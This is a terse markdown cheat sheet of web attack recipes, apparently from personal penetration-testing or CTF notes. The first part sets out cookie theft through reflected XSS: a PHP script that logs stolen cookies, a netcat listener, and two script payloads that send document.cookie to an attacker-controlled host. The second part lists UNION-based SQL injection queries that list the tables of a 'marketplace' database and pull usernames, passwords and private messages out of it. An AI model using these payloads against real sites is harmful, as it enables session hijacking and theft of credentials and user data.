[back](/other/tricks.md)
# steal coockie
https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md
1. find xss
2. create malicious php code
```bash
cat > grabber.php << EOF
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
EOF
```
3. set listener
```bash
rlwrap nc -nvlp <port>
```
4. insert xss:
```js
<script>document.location='http://<your ip>:<port>/grabber.php?c='+document.cookie</script>
```

```js
<script>document.write('<img src="http://<your ip>:80?c='+document.cookie+'" />');</script>
webup
```

# sqli
```
?user=1 order by 5--
0 UNION SELECT 1,database(),3,4
0 UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema='marketplace'
0 UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_schema='marketplace' AND table_name='users'"
0 UNION SELECT 1,GROUP_CONCAT(username),3,4 FROM marketplace.users
0 UNION SELECT 1,GROUP_CONCAT(password),3,4 FROM marketplace.users
0 UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_schema='marketplace' AND table_name='messages'
0 UNION SELECT 1,GROUP_CONCAT(message_content),3,4 FROM marketplace.messages
```